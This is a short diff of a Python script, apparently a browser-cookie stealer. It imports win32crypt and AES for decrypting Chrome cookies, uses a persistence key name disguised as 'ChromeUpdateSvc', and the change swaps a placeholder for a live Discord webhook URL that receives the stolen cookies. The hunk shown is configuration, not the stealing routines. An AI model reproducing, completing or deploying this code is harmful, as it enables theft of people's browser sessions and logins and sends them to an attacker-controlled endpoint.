@@ -10,7 +10,7 @@ import requests
 import win32crypt
 from Crypto.Cipher import AES
 
-COOKIE_WEBHOOK = "YOUR_BROWSER_COOKIE_WEBHOOK_HERE"
+COOKIE_WEBHOOK = "https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
 RUN_KEY_NAME = "ChromeUpdateSvc"
 
 def hostname():
